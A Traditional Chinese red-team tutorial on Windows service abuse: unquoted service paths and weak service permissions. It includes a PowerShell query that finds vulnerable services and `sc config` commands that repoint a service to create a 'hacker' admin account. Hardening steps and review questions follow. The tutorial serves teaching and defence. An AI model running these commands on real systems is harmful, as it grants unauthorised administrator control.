# R19.1 Windows 服務權限缺陷與未加引號路徑提權 (Windows Service Abuse)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Windows 服務權限缺陷與未加引號路徑提權** 的物理本質為**利用 Windows 服務控制管理員 (SCM) 在啟動二進位路徑時的空白字元逐段解析規則（未加雙引號包裹），或服務二進位檔案/登錄檔目錄配置過於寬鬆之存取控制清單 (DACL 可寫)，在合法特權服務啟動前將惡意載荷植入攔截路徑**。在紅隊實戰中，第三方軟體常以 `NT AUTHORITY\SYSTEM` 身份註冊 Windows 服務，但往往將其安裝於 `C:\Program Files (x86)\...` 且路徑未加引號，低權限使用者只要在路徑前端寫入自定義二進位檔，重啟服務即可獲得作業系統最高特權。

```

                                                 │
                                                 ▼ 檢索服務 BinaryPathName 與目錄 ACL
┌────────────────────────────────────────────────┴─────────────────────────────────────────────┐
│ 1. 檢查未加引號服務路徑: C:\Program Files\My App\service.exe (中間包含空白且無雙引號包裹)    │
│ 2. Windows 逐段路徑解析邏輯: C:\Program.exe ➔ C:\Program Files\My.exe ➔ 正確路徑           │
```

## 🔬 第一動：SCM 服務解析器、空白字元切分與 DACL 物理架構 (Mechanics & SCM Parser)

### 1. Windows CreateProcess 解析路徑的缺陷本質
當 Windows 服務控制管理員 (Services.exe) 調用 `CreateProcess()` 啟動服務且路徑未用雙引號 `""` 包裹時，Windows 會從左至右以「空格」為分隔符號，依序嘗試追加 `.exe` 尋找可執行檔：
```
未加引號路徑: C:\Program Files\Vulnerable Service\engine.exe
Windows 核心解析時序:
1. 嘗試執行: C:\Program.exe
2. 嘗試執行: C:\Program Files\Vulnerable.exe
3. 嘗試執行: C:\Program Files\Vulnerable Service\engine.exe
```
若普通使用者對 `C:\` 或 `C:\Program Files\` 具備寫入權限，只需將惡意檔案命名為 `Program.exe` 放置在根目錄下，服務啟動時便會率先被以 `SYSTEM` 權限執行！

### 2. 弱權限服務配置 (Insecure Service Permissions)
Windows 服務物件本身受到安全性描述元 (Security Descriptor) 保護。若普通使用者對某服務具備 `SERVICE_CHANGE_CONFIG` 或 `SERVICE_ALL_ACCESS` 特權，可直接動態修改該服務的執行命令路徑。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 檢測未加引號服務路徑指令
```powershell
# 使用 WMI 查詢所有路徑包含空白、且未被雙引號包裹的本機服務
Get-WmiObject -Class win32_service | Where-Object {
    $_.PathName -notlike '"*' -and $_.PathName -like '* *'
} | Select-Object Name, DisplayName, PathName, StartMode
```

### 2. 弱權限服務直接改寫利用
```cmd
:: 1. 查詢服務當前配置與運行權限
sc qc "VulnerableService"

:: 2. 修改服務執行路徑指向惡意 Payload (添加本機管理員帳號)
sc config "VulnerableService" binpath= "net user hacker P@ssw0rd2026! /add"
sc start "VulnerableService"

:: 3. 將新帳號加入 Administrators 本機管理員群組
sc config "VulnerableService" binpath= "net localgroup administrators hacker /add"
sc start "VulnerableService"
```

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **強制服務二進位路徑雙引號包裹基準**：
   - 透過 PowerShell 腳本掃描註冊表 `HKLM\SYSTEM\CurrentControlSet\Services`，為所有包含空格且未加引號的 `ImagePath` 自動追加雙引號 `""`。

   - 移除 `Users` 或 `Authenticated Users` 對 `C:\` 根目錄與 `C:\Program Files` 的「建立檔案/寫入資料」權限。

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：Windows CreateProcess 函數在處理包含空白且無引號的路徑時，其尋址順序為何？**
  - **戰術思維**：由左至右遇到空格即暫停並加上 `.exe` 進行測試，例如 `C:\Program Files\Sub Dir\app.exe` 會依序嘗試 `C:\Program.exe`、`C:\Program Files\Sub.exe`，最後才是目標程式。
- [ ] **Q2：若在 `C:\` 根目錄成功植入 `Program.exe`，但重啟服務仍未提權，可能原因為何？**
  - **戰術思維**：在現代 Windows (Windows 10/Server 2016+) 中，預設 DACL 不允許普通使用者直接在 `C:\` 根目錄寫入檔案；必須檢查中介子目錄（如 `C:\Program Files\Sub Dir`）是否具備可寫權限。
- [ ] **Q3：利用 `sc config` 修改服務時，`binpath=` 語法有何易踩坑格式要求？**
  - **戰術思維**：`binpath=` 的等號後面**必須包含一個空格**（如 `binpath= "evil.exe"`），若緊貼等號無空格，`sc.exe` 將回傳語法錯誤。
- [ ] **Q4：如果服務為 SYSTEM 運行但處於手動啟動且使用者無權執行 `sc start`，該如何觸發？**
  - **戰術思維**：檢查服務啟動類型是否為自動 (`auto`)，若是自動，可等待系統排程重開機，或利用具備重開機特權 (`SeShutdownPrivilege`) 強制重開主機觸發。
- [ ] **Q5：藍隊應如何自動化獵捕企業全網機器中的未加引號脆弱服務？**
  - **戰術思維**：透過 GPO 派送或 EDR 遙測腳本查詢 `HKLM\SYSTEM\CurrentControlSet\Services` 下所有包含空格且非引號開頭的 `ImagePath`，批次執行加固修復。
